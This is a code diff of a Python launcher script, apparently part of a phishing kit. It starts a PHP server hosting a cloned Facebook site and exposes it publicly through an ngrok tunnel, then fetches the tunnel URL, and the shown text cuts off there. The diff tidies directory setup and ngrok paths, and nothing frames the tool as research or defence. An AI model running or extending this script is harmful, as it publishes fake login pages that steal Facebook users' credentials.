@@ -1,22 +1,22 @@
 import os,time,json,requests
 os.system("./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
 os.system('rm -rf phis.py')
-tm=os.system
+
 #os.system("cd $HOME/sdcard/ngrok/ && chmod +x ngrok")
-if os.path.isdir("Abir")!=True:
-	tm("mkdir -p Abir")
-if os.path.isdir("Abir/www")==True:
-	("rm -rf Abir/www")
-	tm("mkdir -p Abir/www")
-else:
-	tm("mkdir -p Abir/www")
+
+
+
+
+
+
+
 os.system("killall php> /dev/null 2>&1")
-os.system("killall ngrok> /dev/null 2>&1 || killall /ngrok> /dev/null 2>&1")
+os.system("killall ngrok> /dev/null 2>&1 || killall /Abir/ngrok> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
 #os.system("chmod +x./ngrok")
 os.system("cd $HOME/aa/Abir && chmod +x ngrok")
 time.sleep(10)
-#os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
+os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
